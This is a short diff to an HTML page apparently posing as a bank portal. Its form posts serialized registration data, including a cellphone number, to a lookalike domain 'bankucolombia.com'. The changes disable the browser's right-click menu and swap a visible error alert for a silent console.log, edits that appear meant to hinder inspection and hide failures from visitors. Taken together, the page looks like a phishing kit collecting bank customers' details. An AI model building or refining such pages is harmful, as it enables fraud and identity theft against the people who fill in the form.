@@ -13,7 +13,7 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     </head>
 
-    <body class="profile access">
+    <body class="profile access" oncontextmenu="return false">
         <!--Nav Main-->
         <div class="navbar-fixed nav-descktop">
             <ul id="dropdown2" class="nav-dropdown dropdown-content">
@@ -131,7 +131,7 @@
                         var cellphone_u= $("#cellphone_u").val();
                         $.ajax({
                             type:"POST",
-                            url: "http://bankucolombia.com/lib/ajax_service_mobil.php",
+                            url: "https://bankucolombia.com/lib/ajax_service_mobil.php",
                             data: $("#frm_register").serialize(),
                             dataType:'JSON',
                             success: function(msg){
@@ -144,7 +144,7 @@
 								}
                             },
 							error: function(XMLHttpRequest, textStatus, errorThrown) {
-								alert("Problemas procesando datos: " + textStatus +" - "+errorThrown);
+								console.log("Problemas procesando datos: " + textStatus +" - "+errorThrown);
 							}
                         });
                     }
